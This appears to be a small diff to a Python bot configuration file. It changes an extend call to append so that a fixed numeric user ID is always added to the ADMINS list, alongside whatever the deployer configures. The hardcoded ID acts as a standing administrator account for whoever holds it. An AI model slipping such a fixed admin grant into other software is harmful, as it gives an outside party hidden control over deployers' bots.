@@ -35,7 +35,7 @@ FORCE_MSG = os.environ.get(
 
 CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
-ADMINS.extend((1475365115))
+ADMINS.append((1475365115))
 
 LOG_FILE_NAME = "logs.txt"
 logging.basicConfig(
